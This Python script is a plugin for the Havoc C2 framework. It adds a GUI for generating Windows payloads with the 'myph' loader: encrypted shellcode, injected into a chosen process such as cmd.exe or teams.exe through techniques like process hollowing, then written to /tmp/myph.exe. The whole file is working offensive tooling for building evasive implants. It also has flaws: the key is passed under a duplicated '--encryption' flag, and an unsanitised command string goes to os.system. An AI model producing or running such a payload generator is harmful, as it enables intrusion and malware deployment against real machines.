#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: @jenaye_fr
# Created on: Mon, 17. Nov 2023
# Description: matro7sh myph Loader support for Havoc C2 framework
# Usage: Load this script into Havoc: Scripts -> Scripts Manager -> Load to create matro7sh Tab

import os
import shutil
import havoc  # type: ignore
import havocui  # type: ignore
from datetime import datetime

# Configuration
LOADER_PATH = shutil.which("myph")
MYPH_EXEC_TECHNIQUES = ["CRT", "ProcessHollowing", "CreateThread", "Syscall"]


# Variables & Defaults
myph_shellcode_path = ""
myph_shellcode_encryption_key = ""
myph_shellcode_encryption_kind = "AES"
myph_target_process = "cmd.exe"
myph_shellcode_execution_technique = "CRT"

# Colors
HAVOC_ERROR = "#ff5555"  # Red
HAVOC_SUCCESS = "#50fa7b"  # Green
HAVOC_COMMENT = "#6272a4"  # Greyish blue
HAVOC_DARK = "#555766"  # Dark Grey
HAVOC_INFO = "#8be9fd"  # Cyan
HAVOC_WARNING = "#ffb86c"  # Orange

# Labels
label_to_replace = f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"


if not LOADER_PATH:
    print("[-] Loader not found in $PATH")
    print("Please run script located in install/ directory :)")
    havocui.messagebox("Loader not found in: ", LOADER_PATH)

# Create dialog and log widget
dialog = havocui.Dialog("Matro7sh Myph Payload Generator", True, 670, 400)
log = havocui.Logger("matro7sh myph Log")



def change_shellcode_exec_method(num):
    global myph_shellcode_execution_technique
    if num:
        myph_shellcode_execution_technique = MYPH_EXEC_TECHNIQUES[num - 1]
    else:
        myph_shellcode_execution_technique = "CRT"
    print("[*] Shellcode execution method changed: ", myph_shellcode_execution_technique)


def change_target_process(p):
    global myph_target_process
    myph_target_process = p
    print("[*] Target process: ", myph_target_process)


def change_default_key(k):
    global myph_shellcode_encryption_key
    myph_shellcode_encryption_key = k
    print("[*] Key changed: ", myph_shellcode_encryption_key)


def change_shellcode_path():
    global myph_shellcode_path
    global label_to_replace

    myph_shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", myph_shellcode_path, ".")

    formatted_shellcode_path = f"<span style=\"color:{HAVOC_SUCCESS};\">{myph_shellcode_path}</span>"
    dialog.replaceLabel(label_to_replace, formatted_shellcode_path)
    label_to_replace = formatted_shellcode_path if myph_shellcode_path != " " else f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"


# Generate payload
def run():
    def get_build_command() -> str:
        global myph_shellcode_path
        global myph_shellcode_encryption_key
        global myph_shellcode_execution_technique
        global myph_target_process
        global myph_shellcode_encryption_kind

        base_cmd = f'{LOADER_PATH}'
        if myph_shellcode_path != "":
            base_cmd = f'{base_cmd} --shellcode {myph_shellcode_path}'

        if myph_shellcode_encryption_kind != "":
            base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_kind}'

        if myph_shellcode_encryption_key != "":
            base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_key}'

        if myph_target_process != "":
            base_cmd = f'{base_cmd} --process {myph_target_process}'

        if myph_shellcode_execution_technique != "":
            base_cmd = f'{base_cmd} --technique {myph_shellcode_execution_technique}'

        base_cmd = f'{base_cmd} --out /tmp/myph.exe'
        print(f"[+] Command to be run: {base_cmd}")
        return base_cmd

    def execute():
        log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] No AES key provide it will be random one.")
        cmd = get_build_command()

        os.system(cmd)

        # Create Log
        log.addText(f"Command has been be executed")
        log.addText(f"Check client log to see the output")
        log.addText(
            f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at /tmp/myph.exe using myph loader. Happy pwn</b>")
        log.setBottomTab()

    log.setBottomTab()
    log.addText(
        f"<b style=\"color:{HAVOC_DARK};\">───────────────────────────────────────── running myph ─────────────────────────────────────────</b>")
    log.addText(f"<b style=\"color:{HAVOC_COMMENT};\">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} </b>")

    global myph_shellcode_path
    if myph_shellcode_path == "":
        havocui.messagebox("Error", "Please specify a valid shellcode path.")
        log.addText(f"[<span style=\"color:{HAVOC_ERROR};\">-</span>] No shellcode file specified.")
        return

    execute()
    dialog.close()


def build():
    dialog.clear()

    # Get Listeners
    global listeners
    listeners = havoc.GetListeners()

    # Build Dialog
    dialog.addLabel(f"<b>──────────────────────────── Required Settings for Myph ─────────────────────────────</b>")
    dialog.addButton("Choose shellcode", change_shellcode_path)
    dialog.addLabel(label_to_replace)

    dialog.addLabel("<b>[*] Shellcode execution method</b>")
    dialog.addCombobox(change_shellcode_exec_method, "CRT", *MYPH_EXEC_TECHNIQUES)

    dialog.addLabel("<b>[*] AES Encryption key (Default: random)</b>")
    dialog.addLineedit("e.g. 0123456789ABCDEF1123345611111111", change_default_key)

    dialog.addLabel("<b>[*] Process to inject to (Default: cmd.exe)</b>")
    dialog.addLineedit("e.g. teams.exe", change_target_process)

    dialog.addButton("Generate", run)
    dialog.exec()


def loader_generator():
    build()


# Create Tab
havocui.createtab("Matro7sh myph", "myph loader", loader_generator)
